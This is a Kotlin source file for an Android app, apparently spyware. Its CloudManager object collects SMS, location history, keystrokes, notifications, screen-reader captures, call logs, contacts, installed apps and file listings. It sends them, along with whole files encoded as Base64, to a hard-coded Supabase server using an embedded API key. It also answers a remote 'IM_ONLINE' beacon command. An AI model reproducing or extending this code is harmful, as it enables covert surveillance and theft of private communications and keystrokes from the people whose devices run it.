package com.example.myandroid

import android.content.Context
import android.widget.TextView
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CloudManager {

    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
    fun uploadData(ctx: Context, modules: List<String>, btn: TextView? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")
                
                // Check Global Config before uploading
                if (!ConfigManager.canUpload(ctx) && btn == null) {
                    DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
                    return@launch
                }

                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)
                json.put("trigger", if (btn != null) "MANUAL" else "AUTO")
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = modules.contains("ALL")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || modules.contains("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                }

                // --- MODULE 2: SMS ---
                if (isAll || modules.contains("sms")) {
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                    json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
                }

                // --- MODULE 3: USAGE ---
                if (isAll || modules.contains("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val startToday = TimeManager.getStartOfDay()
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                     val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                         stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                     )
                     
                     json.put("screen_time_minutes", totalMins)
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                     
                     // Online Time
                     val (netTime, netSessions) = NetworkTracker.getStats(ctx)
                     json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime))
                     json.put("online_sessions", netSessions)
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || modules.contains("location")) {
                    json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", JSONArray(prefs.getString("typing_history", "[]")))
                }
                
                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: PHONE (FORENSIC) ---
                if (isAll || modules.contains("phone")) {
                     json.put("calls", PhoneManager.getCallLogs(ctx))
                     json.put("contacts", PhoneManager.getContacts(ctx))
                     json.put("apps", AppListManager.getInstalledApps(ctx))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    json.put("file_skeleton", FileManager.generateReport())
                }
                
                // --- MODULE 9: NOTIFICATIONS ---
                if (isAll || modules.contains("notifications")) {
                     json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
                }

                // --- SUMMARY STATS AGGREGATION ---
                val summary = JSONObject()
                val distKm = prefs.getFloat("total_distance_km", 0f)
                summary.put("location_dist_km", distKm)
                
                val typeStats = TypingManager.getStats(ctx)
                summary.put("typing_chars", typeStats.getInt("total_chars"))
                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
                
                val phoneStats = PhoneManager.getStats(ctx)
                summary.put("call_duration_sec", phoneStats.totalDuration)
                summary.put("call_count_total", phoneStats.totalCalls)
                summary.put("contact_count", phoneStats.contactCount)
                
                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                summary.put("app_switch_count", UsageManager.getSwitchCount(ctx))
                
                json.put("summary_stats", summary)

                // SEND TO SUPABASE
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                val os = conn.outputStream
                os.write(json.toString().toByteArray())
                os.flush()
                os.close()

                val code = conn.responseCode
                DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                
                if (btn != null) {
                    withContext(Dispatchers.Main) {
                        if (code in 200..299) {
                            btn.text = "UPLOAD SUCCESS ✅"
                            btn.background.setTint(0xFF2CB67D.toInt())
                        } else {
                             btn.text = "FAILED: $code ❌"
                             btn.background.setTint(0xFFEF4565.toInt())
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                if (btn != null) {
                    withContext(Dispatchers.Main) {
                         btn.text = "ERROR: ${e.message}"
                         btn.background.setTint(0xFFEF4565.toInt())
                    }
                }
            }
        }
    }

    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
    fun collectDumpData(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. System Vitals
        json.put("static", DeviceManager.getStaticInfo(ctx))
        json.put("health", DeviceManager.getHealthStats(ctx))
        
        // 2. STREAM LOGGING RECOVERY
        // This pulls all the data from the 'offline_buffer.jsonl' file
        val logs = DumpManager.getAndClearLogs()
        json.put("sms", logs.optJSONArray("SMS") ?: JSONArray())
        json.put("loc", logs.optJSONArray("LOC") ?: JSONArray())
        json.put("typing", logs.optJSONArray("KEY") ?: JSONArray())
        json.put("notifs", logs.optJSONArray("NOTIF") ?: JSONArray())
        json.put("screen_reader", logs.optJSONArray("SCREEN") ?: JSONArray())
        
        // 3. Persistent Data (The Deep Dive)
        json.put("calls", PhoneManager.getCallLogs(ctx))
        json.put("contacts", PhoneManager.getContacts(ctx))
        json.put("apps", AppListManager.getInstalledApps(ctx))

        // 4. File System
        try {
             if (PermissionManager.hasAllFilesAccess(ctx)) {
                 json.put("file_tree", FileManager.generateReport())
             }
        } catch(e: Exception) { json.put("file_tree", "ERROR: ${e.message}") }

        return json
    }

    // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
    fun sendPing(ctx: Context, note: String = "Online") {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("trigger", "BEACON")
                json.put("note", note)
                json.put("timestamp", System.currentTimeMillis())
                
                val summary = JSONObject()
                summary.put("status", "ONLINE")
                json.put("summary_stats", summary)

                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { it.write(json.toString().toByteArray()) }
                DebugLogger.log("BEACON", "Ping sent ($note). Code: ${conn.responseCode}")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    // --- SYNCHRONOUS FILE UPLOAD (Returns Boolean for Worker Retry) ---
    suspend fun uploadFile(ctx: Context, file: java.io.File): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("CLOUD", "Starting Upload: ${file.name}")
                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("filename", file.name)
                // ENCODING: Convert file to Base64 to send via JSON (Simpler than Multipart)
                val bytes = file.readBytes()
                val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                json.put("file_data", base64)
                json.put("trigger", "FILE_UPLOAD")

                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { it.write(json.toString().toByteArray()) }
                
                val code = conn.responseCode
                DebugLogger.log("CLOUD", "Upload ${file.name} Result: $code")
                return@withContext code in 200..299
            } catch (e: Exception) {
                DebugLogger.log("CLOUD", "Upload Failed: ${e.message}")
                return@withContext false
            }
        }
    }

    fun uploadSkeleton(ctx: Context, json: JSONObject, btn: TextView? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/storage_backups"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true

                conn.outputStream.use { it.write(json.toString().toByteArray()) }
                val code = conn.responseCode
                DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")

                if (btn != null) {
                    withContext(Dispatchers.Main) {
                        if (code in 200..299) {
                            btn.text = "BACKUP COMPLETE ✅"
                            btn.background.setTint(0xFF2CB67D.toInt())
                        } else {
                            btn.text = "FAILED: $code ❌"
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
